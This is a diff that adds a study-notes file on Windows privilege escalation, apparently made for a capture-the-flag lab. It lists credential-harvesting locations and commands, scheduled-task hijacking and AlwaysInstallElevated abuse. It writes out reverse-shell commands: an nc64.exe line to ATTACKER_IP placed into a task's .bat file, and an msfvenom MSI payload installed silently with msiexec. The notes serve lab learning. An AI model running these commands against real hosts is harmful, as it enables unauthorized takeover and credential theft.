@@ -1,0 +1,137 @@
+Windows Users:
+	Administrators:	These users have the most privileges. They can change any system configuration parameter and access 
+					any file in the system.
+	Standard Users:	These users can access the computer but only perform limited tasks. Typically these users can not 
+					make permanent or essential changes to the system and are limited to their files.
+
+Any user with administrative privileges will be part of the Administrators group. On the other hand, standard users are 
+part of the Users group.
+
+
+SYSTEM / LocalSystem:
+	An account used by the operating system to perform internal tasks. It has full access to all files and resources 
+	available on the host with even ___{higher privileges than administrators}___.
+
+Local Service:
+	Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the 
+	network.
+
+Network Service:
+	Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to 
+	authenticate through the network.
+
+1-Harvesting Passwords from Usual Spots:
+	-> Unattended Windows Installations:
+		   When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, 
+		   whichallows for a single operating system image to be deployed to several hosts through the network. These 
+		   kinds oinstallations are referred to as unattended installations as they don't require user interaction. 
+		   Suchinstallations require the use of an administrator account to perform the initial setup, which might end 
+		   upbeing stored in the machine in the following locations:
+		    -> C:\Unattend.xml
+		    -> C:\Windows\Panther\Unattend.xml
+		    -> C:\Windows\Panther\Unattend\Unattend.xml
+		    -> C:\Windows\system32\sysprep.inf
+		    -> C:\Windows\system32\sysprep\sysprep.xml
+	1.1-Powershell History
+		-> on CMD only => type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+	
+	1.2-Saved Windows Credentials
+		-> cmdkey /list 
+			Output EX:
+	            Currently stored credentials:          
+	            Target: Domain:interactive=WPRIVESC1\mike.katz
+				Type: Domain Password
+				User: WPRIVESC1\mike.katz
+
+				Target: Domain:interactive=WPRIVESC1\julia
+				Type: Domain Password
+				User: WPRIVESC1\julia
+
+				Target: Domain:interactive=WPRIVESC1\julia.local
+				Type: Domain Password
+				User: WPRIVESC1\julia.local
+
+				Target: Domain:interactive=WPRIVESC1\mkie.katz
+				Type: Domain Password
+				User: WPRIVESC1\mkie.katz
+				
+				Target: Domain:interactive=WPRIVESC1\thmdc                                                       
+				Type: Domain Password
+				User: WPRIVESC1\thmdc        
+		then use this command:
+			runas /savecred /user:userNameFromTargetResult cmd.exe
+			runas /savecred /user:mkie.katz cmd.exe
+
+	1.3-Internet Information Services(IIS) Configuration
+		-> The configuration of websites on IIS is stored in a file called __{web.config}__ and can store passwords for databases 
+		   or configured authentication mechanisms:
+		      we can find __{web.config}__ in one of the following locations:
+			    location_1 -> C:\inetpub\wwwroot\web.config
+			    location_2 -> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+		    
+		    Here is a quick way to find database connection strings on the file:
+				type location_1 | findstr connectionString
+				type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+
+	1.4-Retrieve Credentials from Software: PuTTY
+		-> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+2-Other Quick Wins:
+	2.1-We Can Listed Scheduled tasks with Command 
+			-> schtasks
+		To retrieve detailed information about any of the services,We use command 
+			-> schtasks /query /tn vulntask /fo list /v
+		look at
+			."Task to Run" -> parameter which indicates what gets executed by the scheduled task.
+			."Run As User" -> parameter, which shows the user that will be used to execute the task.
+		If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the "Run As User" user,
+		resulting in a simple privilege escalation. 
+		To check the file permissions on the executable, we use:
+			-> icacls c:\tasks\schtask.bat
+			-> (F) mean that this group has full access permissions
+			-> (M) mean that this group has modify 		permissions
+		then Try to Gain reverse shell with this .bat file like Download nc64.exe
+		and in cmd write:
+			-> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+		The next time the scheduled task runs, we should receive the reverse shell with taskusr1 privileges.
+		While you probably wouldn't be able to start the task in a real scenario but this command may be run task
+			-> schtasks /run /tn vulntask
+
+3-AlwaysInstallElevated:
+	Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level 
+	of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). 
+	This could potentially allow us to generate a malicious MSI file that would run with admin privileges.
+
+	You can query these from the command line using the commands below.
+		-> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+		-> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+ 	note:
+ 		To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible.
+	if these are set, you can generate a malicious .msi file using msfvenom, as seen below:
+		 -> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.129.190 LPORT=LOCAL_PORT -f msi -o malicious.msi
+	As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly
+	Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
+		-> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
+        
+4-Abusing Service Misconfigurations:
+	4.1-Windows Services:
+		Windows services are managed by the Service Control Manager (SCM).
+		To check the configuration of Services:
+			-> sc qc Service_Name
+				BINARY_PATH_NAME   -> path of executable Services 
+				SERVICE_START_NAME -> account used to run the service 
+		All of the services configurations are stored on the registry Path:
+			-> HKLM\SYSTEM\CurrentControlSet\Services\
+
+
+		to List All services:
+			-> net start 
+
+https://www.youtube.com/watch?v=CkVvB5woQRM&t=244s
+https://www.youtube.com/watch?v=sPI8Fd-vB3k&t=2714s
+https://www.youtube.com/watch?v=z7fEh2YNjOc&list=RDLVz7fEh2YNjOc&start_radio=1
+https://www.youtube.com/watch?v=i576YkwhIUE
+https://www.youtube.com/watch?v=A8CNysN-lOM
+https://www.youtube.com/watch?v=fb-t3WWHsMQ
+https://www.youtube.com/watch?v=z7fEh2YNjOc
